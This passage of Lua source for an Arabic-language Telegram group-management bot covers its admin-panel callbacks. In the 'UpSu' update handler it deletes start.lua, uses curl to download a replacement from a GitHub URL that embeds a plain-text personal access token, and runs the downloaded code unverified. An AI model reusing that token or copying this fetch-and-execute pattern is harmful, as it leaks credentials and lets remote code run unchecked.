for k,v in pairs(developer) do
if k == 1 then
t =  t..'"'..v..'"'
else
t = t..',"'..v..'"'
end
end   
t = t..']'
end
t = t..',"Dev":"H.muaed",'
for k,v in pairs(list) do
Creator = redis:smembers(bot_id..":"..v..":Status:Creator")
BasicConstructor = redis:smembers(bot_id..":"..v..":Status:BasicConstructor")
Constructor = redis:smembers(bot_id..":"..v..":Status:Constructor")
Owner = redis:smembers(bot_id..":"..v..":Status:Owner")
Administrator = redis:smembers(bot_id..":"..v..":Status:Administrator")
Vips = redis:smembers(bot_id..":"..v..":Status:Vips")
linkid = v or ''
if k == 1 then
t = t..'"'..v..'":{"info":true,'
else
t = t..',"'..v..'":{"info":true,'
end
if #Creator ~= 0 then 
t = t..'"Creator":['
for k,v in pairs(Creator) do
if k == 1 then
t =  t..'"'..v..'"'
else
t = t..',"'..v..'"'
end
end   
t = t..'],'
end
if #BasicConstructor ~= 0 then 
t = t..'"BasicConstructor":['
for k,v in pairs(BasicConstructor) do
if k == 1 then
t =  t..'"'..v..'"'
else
t = t..',"'..v..'"'
end
end   
t = t..'],'
end
if #Constructor ~= 0 then
t = t..'"Constructor":['
for k,v in pairs(Constructor) do
if k == 1 then
t =  t..'"'..v..'"'
else
t = t..',"'..v..'"'
end
end   
t = t..'],'
end
if #Owner ~= 0 then
t = t..'"Owner":['
for k,v in pairs(Owner) do
if k == 1 then
t =  t..'"'..v..'"'
else
t = t..',"'..v..'"'
end
end   
t = t..'],'
end
if #Administrator ~= 0 then
t = t..'"Administrator":['
for k,v in pairs(Administrator) do
if k == 1 then
t =  t..'"'..v..'"'
else
t = t..',"'..v..'"'
end
end   
t = t..'],'
end
if #Vips ~= 0 then
t = t..'"Vips":['
for k,v in pairs(Vips) do
if k == 1 then
t =  t..'"'..v..'"'
else
t = t..',"'..v..'"'
end
end   
t = t..'],'
end
t = t..'"GroupsId":"'..linkid..'"}' or ''
end
t = t..'}}'
local File = io.open('./'..bot_id..'.json', "w")
File:write(t)
File:close()
bot.sendDocument(chat_id, 0,'./'..bot_id..'.json','- عدد مجموعات التي في البوت { '..#list..'}\n- عدد  الاعضاء التي في البوت { '..#user_idf..'}\n- عدد الثانويين في البوت { '..#programmer..'}\n- عدد المطورين في البوت { '..#developer..'}', 'md')
dofile("start.lua")
end
if Text == "Delch" then
if not redis:get(bot_id..":TheCh") then
bot.answerCallbackQuery(data.id, "‹ : لم يتم وضع اشتراك في البوت .", true)
return false
end
local reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = '‹ : رجوع',data="Can"}},
}
}
bot.editMessageText(chat_id,msg_id,"*‹ : تم حذف البوت بنجاح .*", 'md', true, false, reply_markup)
redis:del(bot_id..":TheCh")
end
if Text == "addCh" then
local reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = '‹ : رجوع',data="Can"}},
}
}
bot.editMessageText(chat_id,msg_id,"*‹ : قم برفع البوت ادمن في قناتك ثم قم بأرسل توجيه من القناه الى البوت .*", 'md', true, false, reply_markup)
redis:set(bot_id..":set:"..chat_id..":addCh",true)
end
if Text == 'TheCh' then
if not redis:get(bot_id..":TheCh") then
bot.answerCallbackQuery(data.id, "‹ : لم يتم وضع اشتراك في البوت .", true)
return false
end
idD = redis:get(bot_id..":TheCh")
Get_Chat = bot.getChat(idD)
Info_Chats = bot.getSupergroupFullInfo(idD)
reply_dev = bot.replyMarkup{
type = 'inline',data = {
{{text = Get_Chat.title,url=Info_Chats.invite_link.invite_link}},
{{text = '‹ : رجوع',data="Can"}},
}
}
bot.editMessageText(chat_id,msg_id,"*‹ : الاشتراك الاجباري على القناه اسفل :*", 'md', true, false, reply_dev)
end
if Text == "indfo" then
Groups = redis:scard(bot_id..":Groups")   
user_id = redis:scard(bot_id..":user_id") 
reply_dev = bot.replyMarkup{
type = 'inline',data = {
{{text = '‹ : رجوع',data="Can"}},
}
}
bot.editMessageText(chat_id,msg_id,"*‹ : اهلا بك في قسم الاحصائيات \n *ٴ━═━═━═━═━═━═━═━*\n‹ : عدد المشتركين ( "..user_id.." ) عضو \n‹ : عدد المجموعات ( "..Groups.." ) مجموعه *", 'md', true, false, reply_dev)
end
if Text == "chatmem" then
reply_dev = bot.replyMarkup{
type = 'inline',data = {
{{text = '‹ : اضف اشتراك .',data="addCh"},{text ="‹ : حذف اشتراك .",data="Delch"}},
{{text = '‹ : الاشتراك .',data="TheCh"}},
{{text = '‹ : رجوع .',data="Can"}},
}
}
bot.editMessageText(chat_id,msg_id,"*‹ : اهلا بك في لوحه اوامر الاشتراك الاجباري*", 'md', true, false, reply_dev)
end
if Text == "EditDevbot" then
local reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = '‹ : رجوع .',data="Can"}},
}
}
bot.editMessageText(chat_id,msg_id,"*‹ : قم الان بأرسل ايدي المطور الجديد .*", 'md', true, false, reply_markup)
redis:set(bot_id..":set:"..chat_id..":dev",true) 
end
if Text == "addstarttxt" then
local reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = '‹ : رجوع',data="Can"}},
}
}
bot.editMessageText(chat_id,msg_id,"*‹ : قم الان بأرسل كليشه ستارت الجديده*", 'md', true, false, reply_markup)
redis:set(bot_id..":set:"..chat_id..":start",true) 
end
if Text == 'lsbnal' then
t = '\n*‹ : قائمه محظورين عام  \n  ٴ━═━═━═━═━═━═━═━*\n'
local Info_ = redis:smembers(bot_id..":bot:Ban") 
if #Info_ == 0 then
bot.answerCallbackQuery(data.id, "‹ : لا يوجد محظورين بالبوت", true)
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.."*"..k.." ‹ :* ["..v.."](tg://user?id="..v..")\n"
end
end
reply_dev = bot.replyMarkup{
type = 'inline',data = {
	{{text = '‹ : الاحصائيات .',data="indfo"}},
	{{text = '‹ : تغيير المطور الاساسي .',data="EditDevbot"}},
{{text = '‹ : تغيير اسم البوت .',data="namebot"},{text =(redis:get(bot_id..":namebot") or "لاريكا"),data="delnamebot"}},
{{text = '‹ : تغيير كليشه ستارت .',data="addstarttxt"},{text ="‹ : حذف كليشه ستارت .",data="Deltxtstart"}},
{{text = '‹ : تنظيف المشتركين .',data="clenMsh"},{text ="‹ : تنظيف المجموعات .",data="clenMg"}},
{{text = 'التواصل',data="..."},{text ='اشعارات',data=".."},{text ='الاذاعه',data="...."},{text = 'المغادره',data="..."},{text = 'التعريف',data="..."}},
{{text = ''..Adm_Callback().t..'',data="Twas"},{text = ''..Adm_Callback().n..'',data="Notice"},{text = ''..Adm_Callback().s..'',data="sendbot"},{text = ''..Adm_Callback().d..'',data="Departure"},{text =Adm_Callback().i,data="infobot"}},
{{text = '‹ : الاشتراك الاجباري .',data="chatmem"},{text = '‹ : الاذاعه .',data="sendtomem"}},
{{text = '‹ : مسح المطورين .',data="deldev"},{text ="‹ : مسح الثانويين .",data="delpor"}},
{{text = '‹ : المطورين .',data="lsdev"},{text ="‹ : الثانويين .",data="lspor"}},
{{text = '‹ : مسح المكتومين عام .',data="delmu"},{text ="‹ : مسح المحظورين عام .",data="delbnal"}},
{{text = '‹ : المكتومين عام .',data="lsmu"},{text ="‹ : المحظورين عام .",data="lsbnal"}},
{{text = '‹ : جلب نسخه احتياطيه .',data="GetfJson"},{text = '‹ : رفع نسخه احتياطيه .',data="UpfJson"}},
                {{text = '‹ : تحديث .',data="UpBot"},{text = '‹ : تحديث السورس .',data="UpSu"}},
{{text = '‹ : FSouRce u .',url="t.me/FeLX_TEaM"}},
}
}
bot.editMessageText(chat_id,msg_id,t, 'md', true, false, reply_dev)
end
if Text == 'lsmu' then
t = '\n*‹ : قائمه المكتومين عام .\n   ٴ━═━═━═━═━═━═━═━*\n'
local Info_ = redis:smembers(bot_id..":bot:silent") 
if #Info_ == 0 then
bot.answerCallbackQuery(data.id, "‹ : لا يوجد مكتومين بالبوت", true)
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.."*"..k.." ‹ :* ["..v.."](tg://user?id="..v..")\n"
end
end
reply_dev = bot.replyMarkup{
type = 'inline',data = {
	{{text = '‹ : الاحصائيات .',data="indfo"}},
	{{text = '‹ : تغيير المطور الاساسي .',data="EditDevbot"}},
{{text = '‹ : تغيير اسم البوت .',data="namebot"},{text =(redis:get(bot_id..":namebot") or "لاريكا"),data="delnamebot"}},
{{text = '‹ : تغيير كليشه ستارت .',data="addstarttxt"},{text ="‹ : حذف كليشه ستارت .",data="Deltxtstart"}},
{{text = '‹ : تنظيف المشتركين .',data="clenMsh"},{text ="‹ : تنظيف المجموعات .",data="clenMg"}},
{{text = 'التواصل',data="..."},{text ='اشعارات',data=".."},{text ='الاذاعه',data="...."},{text = 'المغادره',data="..."},{text = 'التعريف',data="..."}},
{{text = ''..Adm_Callback().t..'',data="Twas"},{text = ''..Adm_Callback().n..'',data="Notice"},{text = ''..Adm_Callback().s..'',data="sendbot"},{text = ''..Adm_Callback().d..'',data="Departure"},{text =Adm_Callback().i,data="infobot"}},
{{text = '‹ : الاشتراك الاجباري .',data="chatmem"},{text = '‹ : الاذاعه .',data="sendtomem"}},
{{text = '‹ : مسح المطورين .',data="deldev"},{text ="‹ : مسح الثانويين .",data="delpor"}},
{{text = '‹ : المطورين .',data="lsdev"},{text ="‹ : الثانويين .",data="lspor"}},
{{text = '‹ : مسح المكتومين عام .',data="delmu"},{text ="‹ : مسح المحظورين عام .",data="delbnal"}},
{{text = '‹ : المكتومين عام .',data="lsmu"},{text ="‹ : المحظورين عام .",data="lsbnal"}},
{{text = '‹ : جلب نسخه احتياطيه .',data="GetfJson"},{text = '‹ : رفع نسخه احتياطيه .',data="UpfJson"}},
                {{text = '‹ : تحديث .',data="UpBot"},{text = '‹ : تحديث السورس .',data="UpSu"}},
{{text = '‹ : FSouRce u .',url="t.me/FeLX_TEaM"}},
}
}
bot.editMessageText(chat_id,msg_id,t, 'md', true, false, reply_dev)
end
if Text == "delbnal" then
local Info_ = redis:smembers(bot_id..":bot:Ban")
if #Info_ == 0 then
bot.answerCallbackQuery(data.id, "‹ : لا يوجد محظورين في البوت", true)
return false
end  
redis:del(bot_id..":bot:Ban")
bot.answerCallbackQuery(data.id, "‹ : تم مسح المحظورين بنجاح", true)
end
if Text == "delmu" then
local Info_ = redis:smembers(bot_id..":bot:silent")
if #Info_ == 0 then
bot.answerCallbackQuery(data.id, "‹ : لا يوجد مكتومين في البوت ", true)
return false
end  
redis:del(bot_id..":bot:silent")
bot.answerCallbackQuery(data.id, "‹ : تم مسح المكتومين بنجاح", true)
end
if Text == 'lspor' then
t = '\n*‹ : قائمه الثانويين .\n   ٴ━═━═━═━═━═━═━═━*\n'
local Info_ = redis:smembers(bot_id..":Status:programmer") 
if #Info_ == 0 then
bot.answerCallbackQuery(data.id, "‹ : لا يوجد ثانويين بالبوت", true)
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.."*"..k.." ‹ :* ["..v.."](tg://user?id="..v..")\n"
end
end
reply_dev = bot.replyMarkup{
type = 'inline',data = {
	{{text = '‹ : الاحصائيات .',data="indfo"}},
	{{text = '‹ : تغيير المطور الاساسي .',data="EditDevbot"}},
{{text = '‹ : تغيير اسم البوت .',data="namebot"},{text =(redis:get(bot_id..":namebot") or "لاريكا"),data="delnamebot"}},
{{text = '‹ : تغيير كليشه ستارت .',data="addstarttxt"},{text ="‹ : حذف كليشه ستارت .",data="Deltxtstart"}},
{{text = '‹ : تنظيف المشتركين .',data="clenMsh"},{text ="‹ : تنظيف المجموعات .",data="clenMg"}},
{{text = 'التواصل',data="..."},{text ='اشعارات',data=".."},{text ='الاذاعه',data="...."},{text = 'المغادره',data="..."},{text = 'التعريف',data="..."}},
{{text = ''..Adm_Callback().t..'',data="Twas"},{text = ''..Adm_Callback().n..'',data="Notice"},{text = ''..Adm_Callback().s..'',data="sendbot"},{text = ''..Adm_Callback().d..'',data="Departure"},{text =Adm_Callback().i,data="infobot"}},
{{text = '‹ : الاشتراك الاجباري .',data="chatmem"},{text = '‹ : الاذاعه .',data="sendtomem"}},
{{text = '‹ : مسح المطورين .',data="deldev"},{text ="‹ : مسح الثانويين .",data="delpor"}},
{{text = '‹ : المطورين .',data="lsdev"},{text ="‹ : الثانويين .",data="lspor"}},
{{text = '‹ : مسح المكتومين عام .',data="delmu"},{text ="‹ : مسح المحظورين عام .",data="delbnal"}},
{{text = '‹ : المكتومين عام .',data="lsmu"},{text ="‹ : المحظورين عام .",data="lsbnal"}},
{{text = '‹ : جلب نسخه احتياطيه .',data="GetfJson"},{text = '‹ : رفع نسخه احتياطيه .',data="UpfJson"}},
                {{text = '‹ : تحديث .',data="UpBot"},{text = '‹ : تحديث السورس .',data="UpSu"}},
{{text = '‹ : FSouRce u .',url="t.me/FeLX_TEaM"}},
}
}
bot.editMessageText(chat_id,msg_id,t, 'md', true, false, reply_dev)
end
if Text == 'lsdev' then
t = '\n*‹ : قائمه المطورين .\n   ٴ━═━═━═━═━═━═━═━*\n'
local Info_ = redis:smembers(bot_id..":Status:developer") 
if #Info_ == 0 then
bot.answerCallbackQuery(data.id, "‹ : لا يوجد مطورين بالبوت", true)
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.."*"..k.." - *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.."*"..k.." ‹ :* ["..v.."](tg://user?id="..v..")\n"
end
end
reply_dev = bot.replyMarkup{
type = 'inline',data = {
	{{text = '‹ : الاحصائيات .',data="indfo"}},
	{{text = '‹ : تغيير المطور الاساسي .',data="EditDevbot"}},
{{text = '‹ : تغيير اسم البوت .',data="namebot"},{text =(redis:get(bot_id..":namebot") or "لاريكا"),data="delnamebot"}},
{{text = '‹ : تغيير كليشه ستارت .',data="addstarttxt"},{text ="‹ : حذف كليشه ستارت .",data="Deltxtstart"}},
{{text = '‹ : تنظيف المشتركين .',data="clenMsh"},{text ="‹ : تنظيف المجموعات .",data="clenMg"}},
{{text = 'التواصل',data="..."},{text ='اشعارات',data=".."},{text ='الاذاعه',data="...."},{text = 'المغادره',data="..."},{text = 'التعريف',data="..."}},
{{text = ''..Adm_Callback().t..'',data="Twas"},{text = ''..Adm_Callback().n..'',data="Notice"},{text = ''..Adm_Callback().s..'',data="sendbot"},{text = ''..Adm_Callback().d..'',data="Departure"},{text =Adm_Callback().i,data="infobot"}},
{{text = '‹ : الاشتراك الاجباري .',data="chatmem"},{text = '‹ : الاذاعه .',data="sendtomem"}},
{{text = '‹ : مسح المطورين .',data="deldev"},{text ="‹ : مسح الثانويين .",data="delpor"}},
{{text = '‹ : المطورين .',data="lsdev"},{text ="‹ : الثانويين .",data="lspor"}},
{{text = '‹ : مسح المكتومين عام .',data="delmu"},{text ="‹ : مسح المحظورين عام .",data="delbnal"}},
{{text = '‹ : المكتومين عام .',data="lsmu"},{text ="‹ : المحظورين عام .",data="lsbnal"}},
{{text = '‹ : جلب نسخه احتياطيه .',data="GetfJson"},{text = '‹ : رفع نسخه احتياطيه .',data="UpfJson"}},
                {{text = '‹ : تحديث .',data="UpBot"},{text = '‹ : تحديث السورس .',data="UpSu"}},
{{text = '‹ : FSouRce u .',url="t.me/FeLX_TEaM"}},
}
}
bot.editMessageText(chat_id,msg_id,t, 'md', true, false, reply_dev)
end
if Text == "UpSu" then
bot.answerCallbackQuery(data.id, "‹ : تم تحديث السورس", true)
os.execute('rm -rf start.lua')
os.execute('curl -s https://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@raw.githubusercontent.com/SourceProX/u/main/start.lua -o start.lua')
dofile('start.lua')  
end
if Text == "UpBot" then
bot.answerCallbackQuery(data.id, "‹ : تم تحديث البوت", true)
dofile("start.lua")
end
if Text == "Deltxtstart" then
redis:del(bot_id..":start") 
bot.answerCallbackQuery(data.id, "- تم حذف كليشه ستارت بنجاح .", true)
end
if Text == "delnamebot" then
redis:del(bot_id..":namebot") 
bot.answerCallbackQuery(data.id, "‹ : تم حذف اسم البوت بنجاح", true)
end
if Text == "infobot" then
if redis:get(bot_id..":infobot") then
redis:del(bot_id..":infobot")
else
redis:set(bot_id..":infobot",true)
end
reply_dev = bot.replyMarkup{
type = 'inline',data = {
	{{text = '‹ : الاحصائيات .',data="indfo"}},
	{{text = '‹ : تغيير المطور الاساسي .',data="EditDevbot"}},
{{text = '‹ : تغيير اسم البوت .',data="namebot"},{text =(redis:get(bot_id..":namebot") or "لاريكا"),data="delnamebot"}},
{{text = '‹ : تغيير كليشه ستارت .',data="addstarttxt"},{text ="‹ : حذف كليشه ستارت .",data="Deltxtstart"}},
{{text = '‹ : تنظيف المشتركين .',data="clenMsh"},{text ="‹ : تنظيف المجموعات .",data="clenMg"}},
{{text = 'التواصل',data="..."},{text ='اشعارات',data=".."},{text ='الاذاعه',data="...."},{text = 'المغادره',data="..."},{text = 'التعريف',data="..."}},
{{text = ''..Adm_Callback().t..'',data="Twas"},{text = ''..Adm_Callback().n..'',data="Notice"},{text = ''..Adm_Callback().s..'',data="sendbot"},{text = ''..Adm_Callback().d..'',data="Departure"},{text =Adm_Callback().i,data="infobot"}},
{{text = '‹ : الاشتراك الاجباري .',data="chatmem"},{text = '‹ : الاذاعه .',data="sendtomem"}},
{{text = '‹ : مسح المطورين .',data="deldev"},{text ="‹ : مسح الثانويين .",data="delpor"}},
{{text = '‹ : المطورين .',data="lsdev"},{text ="‹ : الثانويين .",data="lspor"}},
{{text = '‹ : مسح المكتومين عام .',data="delmu"},{text ="‹ : مسح المحظورين عام .",data="delbnal"}},
{{text = '‹ : المكتومين عام .',data="lsmu"},{text ="‹ : المحظورين عام .",data="lsbnal"}},
{{text = '‹ : جلب نسخه احتياطيه .',data="GetfJson"},{text = '‹ : رفع نسخه احتياطيه .',data="UpfJson"}},
                {{text = '‹ : تحديث .',data="UpBot"},{text = '‹ : تحديث السورس .',data="UpSu"}},
{{text = '‹ : FSouRce u .',url="t.me/FeLX_TEaM"}},
}
}
bot.editMessageText(chat_id,msg_id,"*‹ : اهلا بك في قائمه الاوامر : العلامه ( ✅ ) تعني الامر مفعل و ( ❌ ) العكس*", 'md', true, false, reply_dev)
end
if Text == "Twas" then
if redis:get(bot_id..":Twas") then
redis:del(bot_id..":Twas")
else
redis:set(bot_id..":Twas",true)
end
reply_dev = bot.replyMarkup{
type = 'inline',data = {
	{{text = '‹ : الاحصائيات .',data="indfo"}},
	{{text = '‹ : تغيير المطور الاساسي .',data="EditDevbot"}},
{{text = '‹ : تغيير اسم البوت .',data="namebot"},{text =(redis:get(bot_id..":namebot") or "لاريكا"),data="delnamebot"}},
{{text = '‹ : تغيير كليشه ستارت .',data="addstarttxt"},{text ="‹ : حذف كليشه ستارت .",data="Deltxtstart"}},
{{text = '‹ : تنظيف المشتركين .',data="clenMsh"},{text ="‹ : تنظيف المجموعات .",data="clenMg"}},
{{text = 'التواصل',data="..."},{text ='اشعارات',data=".."},{text ='الاذاعه',data="...."},{text = 'المغادره',data="..."},{text = 'التعريف',data="..."}},
{{text = ''..Adm_Callback().t..'',data="Twas"},{text = ''..Adm_Callback().n..'',data="Notice"},{text = ''..Adm_Callback().s..'',data="sendbot"},{text = ''..Adm_Callback().d..'',data="Departure"},{text =Adm_Callback().i,data="infobot"}},
{{text = '‹ : الاشتراك الاجباري .',data="chatmem"},{text = '‹ : الاذاعه .',data="sendtomem"}},
{{text = '‹ : مسح المطورين .',data="deldev"},{text ="‹ : مسح الثانويين .",data="delpor"}},
{{text = '‹ : المطورين .',data="lsdev"},{text ="‹ : الثانويين .",data="lspor"}},
{{text = '‹ : مسح المكتومين عام .',data="delmu"},{text ="‹ : مسح المحظورين عام .",data="delbnal"}},
{{text = '‹ : المكتومين عام .',data="lsmu"},{text ="‹ : المحظورين عام .",data="lsbnal"}},
{{text = '‹ : جلب نسخه احتياطيه .',data="GetfJson"},{text = '‹ : رفع نسخه احتياطيه .',data="UpfJson"}},
                {{text = '‹ : تحديث .',data="UpBot"},{text = '‹ : تحديث السورس .',data="UpSu"}},
{{text = '‹ : FSouRce u .',url="t.me/FeLX_TEaM"}},
}
}
bot.editMessageText(chat_id,msg_id,"*‹ : اهلا بك في قائمه الاوامر : العلامه ( ✅ ) تعني الامر مفعل و ( ❌ ) العكس*", 'md', true, false, reply_dev)
end
if Text == "Notice" then
if redis:get(bot_id..":Notice") then
redis:del(bot_id..":Notice")
else
redis:set(bot_id..":Notice",true)
end
reply_dev = bot.replyMarkup{
type = 'inline',data = {
	{{text = '‹ : الاحصائيات .',data="indfo"}},
	{{text = '‹ : تغيير المطور الاساسي .',data="EditDevbot"}},
{{text = '‹ : تغيير اسم البوت .',data="namebot"},{text =(redis:get(bot_id..":namebot") or "لاريكا"),data="delnamebot"}},
{{text = '‹ : تغيير كليشه ستارت .',data="addstarttxt"},{text ="‹ : حذف كليشه ستارت .",data="Deltxtstart"}},
{{text = '‹ : تنظيف المشتركين .',data="clenMsh"},{text ="‹ : تنظيف المجموعات .",data="clenMg"}},
{{text = 'التواصل',data="..."},{text ='اشعارات',data=".."},{text ='الاذاعه',data="...."},{text = 'المغادره',data="..."},{text = 'التعريف',data="..."}},
{{text = ''..Adm_Callback().t..'',data="Twas"},{text = ''..Adm_Callback().n..'',data="Notice"},{text = ''..Adm_Callback().s..'',data="sendbot"},{text = ''..Adm_Callback().d..'',data="Departure"},{text =Adm_Callback().i,data="infobot"}},
{{text = '‹ : الاشتراك الاجباري .',data="chatmem"},{text = '‹ : الاذاعه .',data="sendtomem"}},
{{text = '‹ : مسح المطورين .',data="deldev"},{text ="‹ : مسح الثانويين .",data="delpor"}},
{{text = '‹ : المطورين .',data="lsdev"},{text ="‹ : الثانويين .",data="lspor"}},
{{text = '‹ : مسح المكتومين عام .',data="delmu"},{text ="‹ : مسح المحظورين عام .",data="delbnal"}},
{{text = '‹ : المكتومين عام .',data="lsmu"},{text ="‹ : المحظورين عام .",data="lsbnal"}},
{{text = '‹ : جلب نسخه احتياطيه .',data="GetfJson"},{text = '‹ : رفع نسخه احتياطيه .',data="UpfJson"}},
                {{text = '‹ : تحديث .',data="UpBot"},{text = '‹ : تحديث السورس .',data="UpSu"}},
{{text = '‹ : FSouRce u .',url="t.me/FeLX_TEaM"}},
}
}
bot.editMessageText(chat_id,msg_id,"*‹ : اهلا بك في قائمه الاوامر : العلامه ( ✅ ) تعني الامر مفعل و ( ❌ ) العكس*", 'md', true, false, reply_dev)
end
if Text == "sendbot" then
if redis:get(bot_id..":sendbot") then
redis:del(bot_id..":sendbot")
else
redis:set(bot_id..":sendbot",true)
end
reply_dev = bot.replyMarkup{
type = 'inline',data = {
	{{text = '‹ : الاحصائيات .',data="indfo"}},
	{{text = '‹ : تغيير المطور الاساسي .',data="EditDevbot"}},
{{text = '‹ : تغيير اسم البوت .',data="namebot"},{text =(redis:get(bot_id..":namebot") or "لاريكا"),data="delnamebot"}},
{{text = '‹ : تغيير كليشه ستارت .',data="addstarttxt"},{text ="‹ : حذف كليشه ستارت .",data="Deltxtstart"}},
{{text = '‹ : تنظيف المشتركين .',data="clenMsh"},{text ="‹ : تنظيف المجموعات .",data="clenMg"}},
{{text = 'التواصل',data="..."},{text ='اشعارات',data=".."},{text ='الاذاعه',data="...."},{text = 'المغادره',data="..."},{text = 'التعريف',data="..."}},
{{text = ''..Adm_Callback().t..'',data="Twas"},{text = ''..Adm_Callback().n..'',data="Notice"},{text = ''..Adm_Callback().s..'',data="sendbot"},{text = ''..Adm_Callback().d..'',data="Departure"},{text =Adm_Callback().i,data="infobot"}},
{{text = '‹ : الاشتراك الاجباري .',data="chatmem"},{text = '‹ : الاذاعه .',data="sendtomem"}},
{{text = '‹ : مسح المطورين .',data="deldev"},{text ="‹ : مسح الثانويين .",data="delpor"}},
{{text = '‹ : المطورين .',data="lsdev"},{text ="‹ : الثانويين .",data="lspor"}},
{{text = '‹ : مسح المكتومين عام .',data="delmu"},{text ="‹ : مسح المحظورين عام .",data="delbnal"}},
{{text = '‹ : المكتومين عام .',data="lsmu"},{text ="‹ : المحظورين عام .",data="lsbnal"}},
{{text = '‹ : جلب نسخه احتياطيه .',data="GetfJson"},{text = '‹ : رفع نسخه احتياطيه .',data="UpfJson"}},
                {{text = '‹ : تحديث .',data="UpBot"},{text = '‹ : تحديث السورس .',data="UpSu"}},
{{text = '‹ : FSouRce u .',url="t.me/FeLX_TEaM"}},
}
}
bot.editMessageText(chat_id,msg_id,"*‹ : اهلا بك في قائمه الاوامر : العلامه ( ✅ ) تعني الامر مفعل و ( ❌ ) العكس*", 'md', true, false, reply_dev)
end
if Text == "Departure" then
if redis:get(bot_id..":Departure") then
redis:del(bot_id..":Departure")
else
redis:set(bot_id..":Departure",true)
end
reply_dev = bot.replyMarkup{
type = 'inline',data = {
	{{text = '‹ : الاحصائيات .',data="indfo"}},
	{{text = '‹ : تغيير المطور الاساسي .',data="EditDevbot"}},
{{text = '‹ : تغيير اسم البوت .',data="namebot"},{text =(redis:get(bot_id..":namebot") or "لاريكا"),data="delnamebot"}},
{{text = '‹ : تغيير كليشه ستارت .',data="addstarttxt"},{text ="‹ : حذف كليشه ستارت .",data="Deltxtstart"}},
{{text = '‹ : تنظيف المشتركين .',data="clenMsh"},{text ="‹ : تنظيف المجموعات .",data="clenMg"}},
{{text = 'التواصل',data="..."},{text ='اشعارات',data=".."},{text ='الاذاعه',data="...."},{text = 'المغادره',data="..."},{text = 'التعريف',data="..."}},
{{text = ''..Adm_Callback().t..'',data="Twas"},{text = ''..Adm_Callback().n..'',data="Notice"},{text = ''..Adm_Callback().s..'',data="sendbot"},{text = ''..Adm_Callback().d..'',data="Departure"},{text =Adm_Callback().i,data="infobot"}},
{{text = '‹ : الاشتراك الاجباري .',data="chatmem"},{text = '‹ : الاذاعه .',data="sendtomem"}},
{{text = '‹ : مسح المطورين .',data="deldev"},{text ="‹ : مسح الثانويين .",data="delpor"}},
{{text = '‹ : المطورين .',data="lsdev"},{text ="‹ : الثانويين .",data="lspor"}},
{{text = '‹ : مسح المكتومين عام .',data="delmu"},{text ="‹ : مسح المحظورين عام .",data="delbnal"}},
{{text = '‹ : المكتومين عام .',data="lsmu"},{text ="‹ : المحظورين عام .",data="lsbnal"}},
{{text = '‹ : جلب نسخه احتياطيه .',data="GetfJson"},{text = '‹ : رفع نسخه احتياطيه .',data="UpfJson"}},
                {{text = '‹ : تحديث .',data="UpBot"},{text = '‹ : تحديث السورس .',data="UpSu"}},
{{text = '‹ : FSouRce u .',url="t.me/FeLX_TEaM"}},
}
}
bot.editMessageText(chat_id,msg_id,"*‹ : اهلا بك في قائمه الاوامر : العلامه ( ✅ ) تعني الامر مفعل و ( ❌ ) العكس*", 'md', true, false, reply_dev)
end
if Text == "namebot" then
local reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = '‹ : رجوع',data="Can"}},
}
}
bot.editMessageText(chat_id,msg_id,"*‹ : قم الان بأرسل اسم البوت الجديد*", 'md', true, false, reply_markup)
redis:set(bot_id..":set:"..chat_id..":namebot",true) 
end
if Text == "delpor" then
local Info_ = redis:smembers(bot_id..":Status:programmer") 
if #Info_ == 0 then
bot.answerCallbackQuery(data.id, "‹ : لا يوجد ثانويين في البوت", true)
return false
end
redis:del(bot_id..":Status:programmer") 
bot.answerCallbackQuery(data.id, "‹ : تم مسح الثانويين بنجاح", true)
end
if Text == "deldev" then
local Info_ = redis:smembers(bot_id..":Status:developer") 
if #Info_ == 0 then
bot.answerCallbackQuery(data.id, "‹ : لا يوجد مطورين في البوت", true)
return false
end
redis:del(bot_id..":Status:developer") 
bot.answerCallbackQuery(data.id, "‹ : تم مسح المطورين بنجاح", true)
end
if Text == "clenMsh" then
local list = redis:smembers(bot_id..":user_id")   
local x = 0
for k,v in pairs(list) do  
local Get_Chat = bot.getChat(v)
local ChatAction = bot.sendChatAction(v,'Typing')
if ChatAction.luatele ~= "ok" then
x = x + 1
redis:srem(bot_id..":user_id",v)
end
end
if x ~= 0 then
reply_dev = bot.replyMarkup{
type = 'inline',data = {
	{{text = '‹ : الاحصائيات .',data="indfo"}},
	{{text = '‹ : تغيير المطور الاساسي .',data="EditDevbot"}},
{{text = '‹ : تغيير اسم البوت .',data="namebot"},{text =(redis:get(bot_id..":namebot") or "لاريكا"),data="delnamebot"}},
{{text = '‹ : تغيير كليشه ستارت .',data="addstarttxt"},{text ="‹ : حذف كليشه ستارت .",data="Deltxtstart"}},
{{text = '‹ : تنظيف المشتركين .',data="clenMsh"},{text ="‹ : تنظيف المجموعات .",data="clenMg"}},
{{text = 'التواصل',data="..."},{text ='اشعارات',data=".."},{text ='الاذاعه',data="...."},{text = 'المغادره',data="..."},{text = 'التعريف',data="..."}},
{{text = ''..Adm_Callback().t..'',data="Twas"},{text = ''..Adm_Callback().n..'',data="Notice"},{text = ''..Adm_Callback().s..'',data="sendbot"},{text = ''..Adm_Callback().d..'',data="Departure"},{text =Adm_Callback().i,data="infobot"}},
{{text = '‹ : الاشتراك الاجباري .',data="chatmem"},{text = '‹ : الاذاعه .',data="sendtomem"}},
{{text = '‹ : مسح المطورين .',data="deldev"},{text ="‹ : مسح الثانويين .",data="delpor"}},
{{text = '‹ : المطورين .',data="lsdev"},{text ="‹ : الثانويين .",data="lspor"}},
